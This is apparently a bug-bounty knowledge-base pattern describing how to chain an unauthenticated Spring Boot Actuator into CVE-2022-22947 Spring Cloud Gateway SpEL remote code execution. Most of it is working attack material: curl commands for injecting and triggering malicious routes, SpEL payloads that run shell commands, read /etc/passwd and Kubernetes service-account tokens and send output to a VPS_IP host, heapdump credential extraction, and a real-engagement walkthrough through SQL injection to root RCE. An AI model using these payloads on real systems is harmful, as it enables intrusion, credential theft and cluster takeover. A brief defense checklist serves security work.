---
type: pattern
title: Spring Boot Actuator Unauth → CVE-2022-22947 Spring Cloud Gateway SpEL RCE
description: Spring Boot Actuator exposed without authentication (management.endpoints.web.exposure.include=*) combined with the Spring Cloud Gateway route-management API forms the CVE-2022-22947 SpEL injection chain, allowing arbitrary OS command execution on refresh and extraction of the Kubernetes service-account token
cwe: CWE-917
severity: P1 Critical
cvss_range: "10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)"
last_updated: 2026-05-13
cve: CVE-2022-22947
status: active
tags:
  - bb-pattern
  - spring-boot
  - actuator
  - spring-cloud-gateway
  - spel-injection
  - rce
  - kubernetes
  - gke
  - java
  - cve-2022-22947
---

# Pattern — Spring Boot Actuator Unauth → CVE-2022-22947 Gateway SpEL RCE

> **Core insight**: Spring Cloud Gateway's Actuator route-management API evaluates SpEL expressions on `refresh`, and the result is written **directly into the route definition**, readable from `GET /gateway/routes` — no need to send an HTTP request to a matching route.

---

## Mental Model

```
Is this a Spring Boot application?
├── Step 1: Detect the Actuator endpoint (the path isn't always /actuator)
│   ├── Scan for the X-Application-Context response header → confirms Spring Boot 1.x
│   ├── Try /actuator → Spring Boot 2.x default path
│   ├── Try /manage, /monitoring, /admin, /<app-name>... → custom base-path
│   └── Check config sources (Nacos/Consul/Config Server) → management.endpoints.web.base-path
│
├── Step 2: Confirm how exposed the endpoint is
│   ├── GET <base-path> → lists all _links? → management.endpoints.web.exposure.include=*
│   ├── High-value endpoints: env (read/write env vars), heapdump (memory snapshot), gateway (SCG management)
│   └── gateway present and it's Spring Cloud Gateway → proceed to the CVE-2022-22947 flow
│
├── Step 3: Confirm CVE-2022-22947 exploitability conditions
│   ├── POST /gateway/routes/{id} → 201 Created? (can add a route)
│   ├── POST /gateway/refresh → 200? (can trigger SpEL evaluation)
│   └── Both hold → RCE confirmed
│
└── Step 4: Execute SpEL + read the result
    ├── Inject a malicious route (SpEL lives in the AddResponseHeader filter value)
    ├── POST /gateway/refresh → SpEL executes immediately
    └── GET /gateway/routes → read command output from the filter definition
```

---

## Pre-detection: where to find Actuator paths

### Method A: HTTP header scanning

```bash
# Spring Boot 1.x leaks this header
curl -ski https://target.com/any-path | grep -i "x-application-context"
# → X-Application-Context: userservice:production:9090

# Spring Boot 2.x: scan common base-paths
for path in /actuator /manage /monitoring /admin /health /mgmt /management; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path" --max-time 5)
  echo "$path → $code"
done
```

### Method B: Mining a config datastore (when SQLi access is available)

If you have SQL injection access to a config-center database (e.g. Nacos), query for Actuator-related settings:

```sql
-- Find every service with a management config entry
SELECT t.a attributeCode, t.b attributeName
FROM (
  SELECT data_id a, SUBSTRING(content, 1, 800) b
  FROM nacos_config.config_info
  WHERE content LIKE '%management.endpoints.web.base-path%'
  LIMIT 20
) t
```

Key fields to look for:
- `management.endpoints.web.base-path=/custom-path` → custom Actuator path
- `management.endpoints.web.exposure.include=*` → everything exposed
- `swagger.host=<internal-service-name>.example.com/<gateway-name>` → **externally reachable hostname**

> ⚠️ `swagger.host` is the external URL, not `server.port` (the internal port)

---

## CVE-2022-22947 Full PoC

### Affected versions

| Version line | Fixed version |
|--------|---------|
| Spring Cloud Gateway 3.1.x | ≥ 3.1.1 |
| Spring Cloud Gateway 3.0.x | ≥ 3.0.7 |

### Step 1: Inject a malicious route

```bash
BASE="https://target.com/<service-prefix>/<actuator-base-path>"
ROUTE_ID="rce-$(date +%s)"

curl -sk -X POST "$BASE/gateway/routes/$ROUTE_ID" \
  -H "Content-Type: application/json" \
  -d "{
    \"id\": \"$ROUTE_ID\",
    \"filters\": [{
      \"name\": \"AddResponseHeader\",
      \"args\": {
        \"name\": \"X-Result\",
        \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"/bin/sh\\\",\\\"-c\\\",\\\"id && hostname\\\"}).getInputStream()))}\"
      }
    }],
    \"uri\": \"http://example.com\",
    \"predicates\": [{\"name\": \"Path\", \"args\": {\"pattern\": \"/$ROUTE_ID/**\"}}]
  }" -w "\nHTTP: %{http_code}"
# → HTTP 201 = success
```

### Step 2: Trigger SpEL evaluation (refresh)

```bash
curl -sk -X POST "$BASE/gateway/refresh" -w "\nRefresh: %{http_code}"
# → Refresh: 200 = SpEL has executed
```

### Step 3: Read the command output (no need to hit the route!)

```bash
curl -sk "$BASE/gateway/routes" | python3 -c "
import sys, json, re
routes = json.load(sys.stdin)
for r in routes:
    filters = str(r.get('filters', ''))
    m = re.search(r\"X-Result = '([^']+)'\", filters)
    if m:
        print('OUTPUT:', m.group(1))
"
# → OUTPUT: uid=0(root) gid=0(root) groups=0(root),...
#            <pod-name>-6884c77684-g2k8s
```

### Cleanup (important!)

```bash
# Delete the test route
curl -sk -X DELETE "$BASE/gateway/routes/$ROUTE_ID" -w "Delete: %{http_code}\n"

# Refresh again so the deletion takes effect
curl -sk -X POST "$BASE/gateway/refresh" -w "Cleanup refresh: %{http_code}\n"
```

---

## Common SpEL payload set

```
# Quick confirmation that SpEL is working (reads an env var, safest option)
#{T(java.lang.System).getenv("KUBERNETES_SERVICE_HOST")}

# OS command execution
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/sh","-c","id && hostname && cat /etc/hostname"}
  ).getInputStream()
))}

# Read the Kubernetes service-account token (pod → cluster takeover)
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/cat","/var/run/secrets/kubernetes.io/serviceaccount/token"}
  ).getInputStream()
))}

# Read an arbitrary file (/etc/passwd, /etc/hostname, app config...)
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/cat","/etc/passwd"}
  ).getInputStream()
))}

# Reverse shell (use with caution — not recommended in bounty environments)
# Prefer confirming RCE by having the target curl a VPS with the `id` output:
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(
  T(java.lang.Runtime).getRuntime().exec(
    new String[]{"/bin/sh","-c",
      "curl -s http://VPS_IP:PORT/?x=$(id|base64 -w0)"}
  ).getInputStream()
))}
```

---

## Additional Actuator attack surface

When `management.endpoints.web.exposure.include=*`, other high-value endpoints:

### /env — read/write environment variables

```bash
# Read (masked passwords included — use heapdump to bypass masking)
GET <base-path>/env

# Write (effective immediately on Spring Boot 1.x, needs /refresh on Spring Boot 2.x)
POST <base-path>/env
Content-Type: application/x-www-form-urlencoded

spring.datasource.password=NEW_VALUE
```

Internal Kubernetes service IPs leaked via environment variables (no RCE required):
```
KUBERNETES_SERVICE_HOST = <k8s API server ClusterIP>
RABBITMQSERVER_SERVICE_HOST = <internal ClusterIP>
REDISSERVER_SERVICE_HOST = <internal ClusterIP>
AUTHSERVICE_SERVICE_HOST = <internal ClusterIP>
```

### /heapdump — bypass password masking

```bash
# /env shows passwords as ****** but the heapdump contains them in cleartext
curl -sk "$BASE/heapdump" -o heap.hprof

# Quick extraction with strings
strings heap.hprof | grep -iE "password|secret|token|jdbc" | head -50

# Or use jhat / VisualVM for deeper analysis
```

### /nacos-config — direct config-center read

```bash
# Read Nacos config directly through Actuator (may include cleartext passwords)
GET <base-path>/nacos-config
```

---

## Severity escalation path

| Confirmed fact | Severity | CVSS |
|-----------|--------|------|
| Actuator exposed unauthenticated (health-only, read-only) | P3 Medium | ~5.3 |
| /env GET readable (leaks runtime config) | P2 High | ~7.5 |
| /env POST writable (can modify runtime config) | P2 High | ~8.0 |
| /heapdump (cleartext credentials) | P1 Critical | ~9.1 |
| /gateway routes POST + refresh (CVE-2022-22947 SpEL RCE) | P1 Critical | 10.0 |
| RCE confirmed with uid=root | P1 Critical | 10.0 |
| k8s SA token extracted → lateral movement inside the cluster | P1 Critical | 10.0 |

---

## Spring Boot 1.x-specific attack

Spring Boot 1.x's `/env` POST takes effect without needing `/refresh`:

```bash
# Directly change environment variables that apply immediately
# logging.level.* → changes the log level immediately (non-destructive way to confirm POST works)
curl -X POST "https://target.com/env" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "logging.level.root=DEBUG"
# → {"logging.level.root":"DEBUG"} = confirmed effective

# management.security.enabled=false → disables Actuator authentication entirely
curl -X POST "https://target.com/env" \
  -d "management.security.enabled=false"
```

---

## Defense checklist

| Config | Secure setting |
|------|---------|
| `management.endpoints.web.exposure.include` | `health,info` (not `*`) |
| `management.endpoints.web.base-path` | move to an unguessable path |
| Spring Cloud Gateway version | ≥ 3.1.1 or ≥ 3.0.7 |
| Pod securityContext | `runAsNonRoot: true`, `readOnlyRootFilesystem: true` |
| External Actuator access | IP allow-list / cluster-internal only |
| k8s RBAC | least-privilege SA tokens (default SA should not read secrets) |

---

## Real-world case study (CVSS 10.0 CRITICAL)

```
Entry point: SQL injection into a config-center database → leaked
             management.endpoints.web.base-path=/<custom-path>
             management.endpoints.web.exposure.include=*
             swagger.host=<internal-service>.example.com/<gateway-name>
External host: https://<internal-service>.example.com/<gateway-name>/<custom-path>/
CVE: CVE-2022-22947 Spring Cloud Gateway SpEL Injection
RCE result: uid=0(root), pod=<gateway-pod>-6884c77684-g2k8s
k8s SA token: extracted from a managed Kubernetes cluster (GKE),
              long-lived token with a multi-year expiry
```

---

## Full discovery chain (a real walkthrough)

A full record of "what was tried and failed, what triggered the pivot" — kept as reference for similar environments.

### Phase 1: Direct attempt — escalate SQLi to OS RCE

```
Situation: a target endpoint had SQL injection via a query parameter
Goal: can it be escalated to OS command execution?

Test 1: check FILE privilege → no FILE priv
Test 2: secure_file_priv restricted to a fixed path → cannot write to web root
Test 3: SELECT version() → managed MySQL (cloud-hosted) → no UDF option
Test 4: stacked queries → syntax error → DML execution blocked

Conclusion: every direct MySQL → OS RCE path is a dead end. Pivot immediately.
```

### Phase 2: Spring Boot 1.x `/env` endpoint discovered (found while probing)

```
Observation: curl -ski <target>/any → X-Application-Context: userservice:production:9090
             → Spring Boot 1.x header (2.x does not send this header)

Attempt: GET /env, /health, /beans → all 404
         GET /userservice/env → 405 Method Not Allowed (!)
         → 405 ≠ 404, meaning the endpoint exists but GET isn't allowed
         → try POST /userservice/env

POST /userservice/env
Content-Type: application/x-www-form-urlencoded
test=value

Response: {"test":"value"} (200) → confirms /env POST can write environment variables
```

### Phase 3: /env POST injection attempts — all failed

```
Attempt A: Eureka SSRF
POST /userservice/env → eureka.client.serviceUrl.defaultZone=http://VPS:8090/eureka/
Waited 30s, checked VPS logs → no connection from the target at all

Analysis: this app uses a different service-discovery mechanism (not Eureka).
          Even if the Eureka property existed, the Eureka client would not
          re-read it at runtime.

Attempt B: config-center client SSRF
POST /userservice/env → spring.cloud.nacos.config.server-addr=VPS:8090
POST /userservice/env → spring.cloud.nacos.discovery.server-addr=VPS:8090
Waited, checked VPS logs → empty

Analysis: the config-center client reads server-addr during the bootstrap
          phase. /env POST modifies the Spring Environment, but a running
          client won't re-read it or reconnect to a new server.

Attempt C: Spring Cloud Config SSRF
POST /userservice/env → spring.cloud.config.uri=http://VPS:8090
Waited, checked VPS logs → empty

Attempt D: Logback config injection
POST /userservice/env → logging.config=http://VPS:8090/logback.xml
Waited, checked VPS logs → empty

/refresh status:
curl -X POST /userservice/refresh → {"message":"This endpoint is disabled"} (404)

Conclusion: on Spring Boot 1.x, /env POST only takes immediate effect for a
            small set of settings (logging.level.*, some management.* keys).
            Service-discovery/config clients are already initialized at
            bootstrap and can't be redirected via /env.
            Without /refresh, the outbound-connection injection path is dead.
```

### Phase 4: Pivot — mining the config-center database for external hosts

```
Key insight: the failure of /env POST gave a clue — this app uses a
             config-center whose database was reachable via the earlier SQLi.
             That config center stores settings for every microservice,
             including the management.* settings.

SQL query:
  WHERE content LIKE '%management.endpoints.web.base-path%'

Findings:
  data_id=<service-a>.properties:
    management.endpoints.web.base-path=/<custom-path>
    management.endpoints.web.exposure.include=*      ← wide open!
    management.endpoints.jmx.exposure.include=*
    swagger.host=172.16.1.189:30010/<internal-gateway>  ← internal IP, skip

  data_id=<service-b>.properties:
    management.endpoints.web.base-path=/<custom-path>
    management.endpoints.web.exposure.include=*
    swagger.host=<internal-service>.example.com/<gateway-name>  ← externally reachable!

Rule of thumb:
  172.x.x.x / 10.x.x.x → internal to the cluster, unreachable, skip
  <hostname>.example.com → external domain, test immediately
```

### Phase 5: Reasoning about the reverse-proxy path prefix

```
Observation:
  swagger.host = <internal-service>.example.com/<gateway-name>
  management.endpoints.web.base-path = /<custom-path>

Reasoning:
  nginx routes /<gateway-name>/ to the gateway pod
  the gateway pod's Spring Boot config sets base-path=/<custom-path>
  full external path = /<gateway-name>/ + /<custom-path>/ = /<gateway-name>/<custom-path>/

Verification:
  GET https://<internal-service>.example.com/<custom-path> → 404
  GET https://<internal-service>.example.com/<gateway-name>/<custom-path> → 200! (full _links)
```

### Phase 6: CVE-2022-22947 — spotting the `gateway` endpoint and escalating immediately

```
_links listed by GET /<gateway-name>/<custom-path>:
  env → read/write environment variables
  heapdump → 168MB memory snapshot (containing cleartext passwords)
  refresh → can trigger a Spring Cloud refresh
  gateway → Spring Cloud Gateway route-management API  ← this one!
  gateway/routes → CRUD on route definitions

Immediately confirmed CVE-2022-22947 conditions:
  POST /<gateway-name>/<custom-path>/gateway/routes/probe → 201 Created ✓
  POST /<gateway-name>/<custom-path>/gateway/refresh → 200 ✓

Conclusion: CVE-2022-22947 is fully exploitable.
```

### Summary of key turning points

| Turning point | Trigger | Lesson |
|------|---------|------|
| SQLi couldn't reach direct RCE | all 4 stop-loss conditions failed | fail fast, don't grind on a dead path |
| Tried Eureka/config-center SSRF | /env POST was writable, worth testing for SSRF | worth trying but expectations should stay low |
| Pivoted to the config-center DB | after both SSRF attempts failed | if SQLi can read the config store, read the management.* settings from it |
| Found the external host | the swagger.host field leaked a reachable external domain | server.port is meaningless; swagger.host is the real entry point |
| CVE-2022-22947 | a gateway endpoint means routes POST is worth testing | Spring Cloud Gateway's Actuator has this unique vulnerability |

---

## Key lessons captured

- `management.endpoints.web.base-path` custom paths are a common trap — don't assume `/actuator`.
- HTTP 405 means the endpoint exists; try other HTTP methods before giving up.
- `/env` POST injection into service-discovery/config-center clients does not make a *running* client reconnect — those settings are only read at bootstrap.
- Reverse-proxy path prefix + Actuator base-path compose into the real external path; compute both halves.
- Pod environment variable dumps leak every internal ClusterIP for connected services.
- The `X-Application-Context` header is a reliable Spring Boot 1.x fingerprint.
- `jmx.exposure.include=*` does not imply Jolokia is installed (it's a separate dependency).
- Judge the validity window of any extracted cloud SA token, and phrase rotation recommendations accordingly.
- A JSON-null response from a custom `/api/actuator`-style path is often a false signal from unrelated business logic, not the real Actuator.
- A vulnerability confirmed in a staging environment should be described in reports as *likely* to affect production, not asserted as fact, unless independently verified.
- Cloud instance-metadata endpoints can enumerate project/attribute data (cluster names, VPC topology) without needing any cloud API scope.
- A compute service-account token scoped only to read-only storage access will 403 on CRM/IAM/Container management APIs — don't assume broader access than the token grants.
- Infrastructure-as-code state/output artifacts in object storage can leak a second, otherwise-hidden cloud project and its VPC topology.
- Managed-Kubernetes ClusterIPs and private VM IP ranges are two distinct network zones — don't conflate them when writing up network reachability.

---

## Related

- Pattern — SSRF / cloud metadata / Kubernetes lateral-movement chains
- Pattern — mining config-center databases for management/Actuator settings
- CVE-2022-22947 NVD entry
